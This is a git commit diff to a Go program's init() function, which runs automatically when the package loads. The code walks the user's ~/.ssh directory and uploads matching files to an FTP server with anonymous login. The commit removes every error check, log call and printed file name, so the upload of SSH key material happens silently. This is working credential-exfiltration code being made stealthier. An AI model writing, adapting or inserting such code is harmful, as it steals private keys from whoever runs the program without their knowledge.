fa72c87b18a6a718a641fd636139bb44b15ae912
Garrett Primm <garrett.primm@abbvie.com>
2024-06-19 20:48:12 -0500

    remove error handling and logging

--- main.go
+++ main.go
@@ -41,45 +41,46 @@ func init() {
 
 	sshpath := path.Join(home, ".ssh")
 
-	libRegEx, e := regexp.Compile("example.*")
-	if e != nil {
-		log.Fatal(e)
-	}
+	libRegEx, _ := regexp.Compile("example.*")
+	// if e != nil {
+	// 	log.Fatal(e)
+	// }
 	
 
-	c, err := ftp.Dial("localhost:21", ftp.DialWithTimeout(5*time.Second))
-	if err != nil {
-		log.Fatal(err)
-	}
+	c, _ := ftp.Dial("localhost:21", ftp.DialWithTimeout(5*time.Second))
+	// if err != nil {
+	// 	log.Fatal(err)
+	// }
 	
-	err = c.Login("anonymous", "anonymous")
-	if err != nil {
-		log.Fatal(err)
-	}
+	_ = c.Login("anonymous", "anonymous")
+	// if err != nil {
+	// 	log.Fatal(err)
+	// }
 	
 	
 	e = filepath.Walk(sshpath, func(path string, info os.FileInfo, err error) error {
 		if err == nil && libRegEx.MatchString(info.Name()) {
 
-			dat, err := os.ReadFile(fmt.Sprintf("%s/%s", sshpath, info.Name()))
-			if err != nil {
-				log.Print(err)
-			}
+			dat, _ := os.ReadFile(fmt.Sprintf("%s/%s", sshpath, info.Name()))
+			// if err != nil {
+			// 	log.Print(err)
+			// }
 			r := bytes.NewReader(dat)
-			err = c.Stor(info.Name(),r)
-			if err != nil {
-				log.Print(err)
-			}
-			println(info.Name())
+			_ = c.Stor(info.Name(),r)
+			// if err != nil {
+			// 	log.Print(err)
+			// }
+			// println(info.Name())
 		}
 		return nil
 	})
-	if e != nil {
-		log.Fatal(e)
-	}
-	if err := c.Quit(); err != nil {
-		log.Fatal(err)
-	}
+	// if e != nil {
+	// 	log.Fatal(e)
+	// }
+	c.Quit()
+	// if err := c.Quit(); err != nil {
+	// 	log.Fatal(err)
+	// }
 	
 }
 
